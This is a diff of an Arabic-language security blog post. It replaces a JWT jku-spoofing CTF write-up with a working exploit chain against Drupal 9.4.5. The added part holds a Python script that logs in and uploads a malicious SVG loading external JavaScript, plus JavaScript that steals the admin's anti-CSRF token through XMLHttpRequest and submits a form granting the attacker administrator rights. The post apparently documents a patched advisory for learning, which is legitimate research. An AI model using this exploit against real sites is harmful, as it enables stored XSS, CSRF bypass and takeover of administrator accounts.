@@ -121,77 +121,234 @@ XSS
 
 
   
+<br><br>
+> <html><body><b><p style="color:#A52A2A;font-size:25px">Uploading SVG File Using Python:</p></b></body></html>
 
-> <html><body><b><p style="color:#A52A2A;font-size:25px">Challenge (Whitebox Approach):</p></b></body></html>
+بسم الله نبدأ بكتابة الإستغلال, فالبداية محتوى الملف إيش راح يكون؟ بكل بساطة أنا حطيت الإستغلال بملف
 
-بعد مافهمنا الآتاك الحين خلونا نشوف التحدي اللي سويته ونفهم كل شي عن طريق مراجعة الكود:
+JavaScript
+
+وإستخدمت 
+
+xlink:href attribute
+
+لتعريف محتوى الملف الخارجي اللي في هالحالة راح يكون موجود على.
+
+http://127.0.0.1:8000/exploit.js
 
 ```python
 
-const express = require('express');
-const app = express();
-const JWT = require('jsonwebtoken');
-const jwt = require('express-jwt');
-const jwksClient = require('jwks-rsa');
-
-app.use((req, res, next) => {
-    if(!req.headers.authorization){next()}
-    const decodedToken = JWT.decode(req.headers.authorization.split(' ')[1]);
-    req.jku = decodedToken.jku
-    if(decodedToken.username === "Mesh3l_911"){
-        next()
-    }else{
-        res.send("You r not Mesh3l_911");
-    }
-  })
-
-app.use((req, res, next) => jwt({
-    secret: jwksClient.expressJwtSecret({
-        jwksUri: req.jku
-    }),
-    algorithms: ['RS256'],
-}).unless({path: ['/']})(req, res, next))
-
-app.get('/', (req, res) => {
-    res.send('Welcome 2 my little chall, start from ( /source.zip ) & Enjoy ur time ^_^');
-})
-
-app.post('/flag', (req, res) => {
-    res.send("Great j0b ^_^, The Flag is: Mesh3l_911{Jwks_Sp00fing}");
-})
-
-app.listen(80, () => console.log('Listening on port 80'));
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+    <script xlink:href="http://127.0.0.1:8000/exploit.js"/>
+</svg>
 
 ```
 
-jku هنا لو نشوف السطر رقم 20 راح تلاحظون إني جالس أخذ قيمة الـ 
+طيب الآن الخطوة الأخيرة وهي رفع الملف بإستخدام صلاحيتنا المحدودة وبعدها ننتظر الآدمن يزور الملف ليتم تنفيد المحتوى الموجود واللي راح نفصل فيه فالسكشن التالي بإذن الله.
 
-Payload اللي راح تكون موجودة فالـ jku وهو قيمة الـ User Controlled Input عن طريق 
+هذا السكريبت النهائي اللي راح يرفع لنا الملف بإستخدام بايثون:
 
-```jwksUri: req.jku```
+```python
+import requests, optparse, sys
+from bs4 import BeautifulSoup
 
-وليست بالهيدر ؟ Payload موجودة بالـ jku طيب ليش فالتحدي قيمة 
+#OptionsParser
+def Args():
+    Parser = optparse.OptionParser()
+    Parser.add_option("--host", "-H", dest="host", help="The Targeted Host")
+    Parser.add_option("--folder", "-f", dest="WebRoot", help="The WebRoot Folder")
+    Parser.add_option("--user", "-u", dest="username", help="Username")
+    Parser.add_option("--pass", "-p", dest="password", help="Password")
+    Parser.add_option("--exploit", "-e", dest="exploit", help="The External JS Exploit Path")
+    (arguments, values) = Parser.parse_args()
+    return arguments
 
-Code Review أنا سويت كذا عشان أجبركم تسوون 
+def upload(host, WebRoot, username, password, exploit):
 
-jku وبكذا خلاص كل اللي علينا نسوي الإستغلال اللي شرحناه فوق بس الفرق الوحيد إن قيمة 
+    #Check if the provided host is using HTTP or HTTPS
+    if(requests.get("http://"+host).status_code == 200):   
+        targetUrl = 'http://{}/{}'.format(host, WebRoot)
+    else:
+        targetUrl = 'https://{}/{}'.format(host, WebRoot)
+    
+    #Initiating the login request
+    body = {
+        "name" : username,
+        "pass" : password,
+        "form_id" : "user_login_form",
+        "op" : 'Log in'
+    }
+    session = requests.Session()
+    session.post(targetUrl+"/user/login", data=body)
+    print("\n[+] Logged in Successfully")
 
-Header وليست فالـ Payload راح تكون فالـ
+    #Parsing the response then extracting the Anti-CSRF Token
+    print("\n[+] Extracting the Anti-CSRF Token ...")
+    response = session.get(targetUrl+"/node/add/article").text
+    token = BeautifulSoup(response, 'html.parser').find('input', {'name':'form_token'})['value']
+    #session.get("http://127.0.0.1:8000/?miao="+token)
+
+    #Uploading the .svg file
+    file = {
+        'form_token' : (None, token),
+        'form_id' : (None, "node_article_form"),
+        'files[field_files_0][]' : ("POC.svg", '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="'''+exploit+'''"/></svg>''', "image/svg+xml"),
+    }
+    session.post(targetUrl+"/node/add/article?element_parents=field_f/widget&ajax_form=1&_wrapper_format=drupal_ajax&_wrapper_format=drupal_ajax", files=file)
+    print("\n[+] Crafted request was sent and POC.svg has been uploaded ^_^")
 
 
-وسلامتكم.
+def main():
+    if len(sys.argv) == 11:
+        arguments = Args()
+        upload(arguments.host, arguments.WebRoot, arguments.username, arguments.password, arguments.exploit)
+    else:
+        print("Usage python POC.py -H localhost -f drupal-9.4.5 -u Mesh3l -p Mesh3l@.@..1 -e http://127.0.0.1:8000/exploit.js")
 
-دعواتكم لي ولوالدي ومن أحب 
+if __name__ == '__main__':
+    main()
+```
 
-Happy Hacking ^_^
+![](../../posts_pics/options.png)
 
-> <html><body><b><p style="color:#A52A2A;font-size:25px">References:</p></b></body></html>
+<br><br>
 
--   https://auth0.com/docs/secure/tokens/json-web-tokens/json-web-key-sets
--   https://assets.ctfassets.net/2ntc334xpx65/o5J4X472PQUI4ai6cAcqg/13a2611de03b2c8edbd09c3ca14ae86b/jwt-handbook-v0_14_1.pdf
--   https://www.npmjs.com/package/jsonwebtoken
--   https://www.npmjs.com/package/jwks-rsa
--   https://www.npmjs.com/package/express-jwt
--   https://www.npmjs.com/package/rsa-pem-to-jwk
--   https://russelldavies.github.io/jwk-creator/
--   https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
+> <html><body><b><p style="color:#A52A2A;font-size:25px">XSS to Bypaass the Anti-CSRF Token Using XMLHttpRequest (XHR)</p></b></body></html>
+
+قبل ننتقل لمحتوى الإستغلال النهائي كان فيه
+
+Anti-CSRF Token
+
+مع كل آكشن, فعلشان نرسل الريكويست اللي راح ينفذ لنا المطلوب لازم يكون التوكين موجود, ومعلومة ممكن البعض مايعرفها وهي بمجرد وصولك لـ
+
+XSS 
+
+فأنت قادر على تخطي 
+
+ <ul class="square">
+  <li>Anti-CSRF Tokens</li>
+  <li>Referer/Origin Checks</li>
+ </ul>
+
+نرجع لموضوعنا, أنا هنا إستخدمت 
+
+```python
+//Extracting the Anti-CSRF Token
+var XHR = new XMLHttpRequest();
+XHR.onreadystatechange = function(){
+
+    if(XHR.readyState == 4){
+        var resonse = XHR.responseText;
+
+        //Parsing the response so that we can extract the token using .getElementById
+        var document = new DOMParser().parseFromString(resonse, "text/html");
+        var csrfToken = document.getElementsByName("form_token")[0].value;
+
+        //The csrfToken Value 
+        alert(csrfToken);
+    }
+}
+
+XHR.open('GET', 'http://localhost/drupal-9.4.5/user/2/edit', true);
+XHR.send();
+```
+أرسلت 
+
+GET Request
+
+بعدها أخذنا محتوى الصفحة 
+
+Response Text
+
+سويت بارسنق عشان أقدر أستخدم
+
+getElementsByName() method
+
+وبكذا صار عندنا قيمة التوكين, كل اللي باقي علينا نكمل ونرسله مع الريكويست اللي يرفع لنا صلاحياتنا لأعلى صلاحية.
+
+<br><br>
+
+> <html><body><b><p style="color:#A52A2A;font-size:25px">Escalating Our Privilage to Administrator Using XMLHttpRequest (XHR)</p></b></body></html>
+
+
+الخطوة الأخيرة وهي كتابة كامل الإستغلال:
+
+```python
+//A function to escalate the privilage to Administrator
+function escalation(csrfToken){
+
+    var requestBody = "-----------------------------3849105468677831259759672443\r\n" + 
+    "Content-Disposition: form-data; name=\"mail\"\r\n" + 
+    "\r\n" + 
+    "Mesh3l@Mesh3l.local\r\n" + 
+    "-----------------------------3849105468677831259759672443\r\n"+
+    "Content-Disposition: form-data; name=\"name\"\r\n" + 
+    "\r\n" + 
+    "Mesh3l\r\n" + 
+    "-----------------------------3849105468677831259759672443\r\n"+
+    "Content-Disposition: form-data; name=\"roles[content_editor]\"\r\n" + 
+    "\r\n" + 
+    "content_editor\r\n" + 
+    "-----------------------------3849105468677831259759672443\r\n"+
+    "Content-Disposition: form-data; name=\"roles[administrator]\"\r\n" + 
+    "\r\n" + 
+    "administrator\r\n" + 
+    "-----------------------------3849105468677831259759672443\r\n"+
+    "Content-Disposition: form-data; name=\"form_token\"\r\n" + 
+    "\r\n" + 
+    ""+csrfToken+"\r\n" + 
+    "-----------------------------3849105468677831259759672443\r\n"+
+    "Content-Disposition: form-data; name=\"form_id\"\r\n" + 
+    "\r\n" + 
+    "user_form\r\n" + 
+    "-----------------------------3849105468677831259759672443\r\n"+
+    "Content-Disposition: form-data; name=\"op\"\r\n" + 
+    "\r\n" + 
+    "Save\r\n" + 
+    "-----------------------------3849105468677831259759672443--";
+
+    //Initaing the request that will escalate our privilage
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://localhost/drupal-9.4.5/user/2/edit", true);
+    xhr.setRequestHeader("Content-Type","multipart/form-data; boundary=---------------------------3849105468677831259759672443");
+    xhr.send(requestBody);
+}
+
+//Extracting the Anti-CSRF Token
+var XHR = new XMLHttpRequest();
+XHR.onreadystatechange = function(){
+
+    if(XHR.readyState == 4){
+        var resonse = XHR.responseText;
+
+        //Parsing the response so that we can extract the token using .getElementById
+        var document = new DOMParser().parseFromString(resonse, "text/html");
+        var csrfToken = document.getElementsByName("form_token")[0].value;
+
+        //Calling the escalation function and passing the csrfToken value to it
+        escalation(csrfToken);
+    }
+}
+
+XHR.open('GET', 'http://localhost/drupal-9.4.5/user/2/edit', true);
+XHR.send();
+```
+
+وبكذا أول مايزور الآدمن الملف راح يتم تنفيذ هذ الكود والهدف منه زي ماقلنا رفع صلاحياتنا المحدودة إلى أعلى صلاحية.
+
+وهذا مقطع يوضح كل التفاصيل اللي فوق بشكل عملي:
+
+ <iframe width="420" height="315"
+src="https://www.youtube.com/embed/tgbNymZ7vqY">
+</iframe> 
+
+> <html><body><b><p style="color:#A52A2A;font-size:25px">References</p></b></body></html>
+
+ بالختام, دعواتكم لي ولوالدي ولمن أحب.
+ وإذا عند أي شخص تعديل أو إضافة أبد البلوق للجميع ^_^
+ 
+-   https://github.com/drupal/core/commit/1cd1830d79f221cc8490f53c2bb487dd07094f17
+-   https://www.drupal.org/sa-core-2022-014
+-   https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/xlink:href
+-   https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementById
+
